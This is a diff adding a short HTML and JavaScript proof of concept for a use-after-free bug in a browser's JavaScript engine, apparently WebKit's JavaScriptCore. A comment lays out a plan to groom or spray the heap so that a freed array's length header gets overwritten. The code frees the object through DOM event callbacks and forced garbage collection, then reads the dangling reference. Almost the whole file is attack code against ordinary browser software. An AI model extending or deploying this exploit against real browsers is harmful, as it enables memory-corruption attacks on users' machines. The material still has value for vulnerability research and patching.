@@ -1,0 +1,29 @@
+// Since worker.GetURL.a's object is freed, and thus is part of uninitialized memory, it might become possible to "shift" the object's butterfly using heap grooming with the reference to it remaining constant. The plan is to try to either shift the middle of worker.GetURL.a's butterfly to the left by one cell, and then overwrite the "length" header of the butterfly by writing to the first element of the array (worker.GetURL.a[0]) and then shift it back, or do a heap spray to do the same thing, but make sure to not touch the pointers to the butterfly and JSCell or else the references are lost.
+<script>
+var worker = null;
+function start() {
+	worker = document.getElementById("worker");
+	window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
+	var intl = setInterval(function() {
+		worker.GetURL.a = [1, 2, 3];
+		window.top.f();
+		clearInterval(intl);
+	}, 1);
+}
+// Induce garbage collection.
+function gc() {
+	for (let i = 0; i < 0x40; i++)
+		new ArrayBuffer(0x1000000);
+}
+function callback0(ev) {
+// Free worker.GetURL.a (m_scriptObject), but maintain the reference to it. Then call callback().
+	window.requestAnimationFrame(callback);
+}
+function callback(ev) {
+	gc();
+	alert(worker.GetURL.a);	// UAF here.
+}
+</script>
+<body onload="start();">
+<embed id="worker" src="data:video/mp4;"></embed>
+</body>
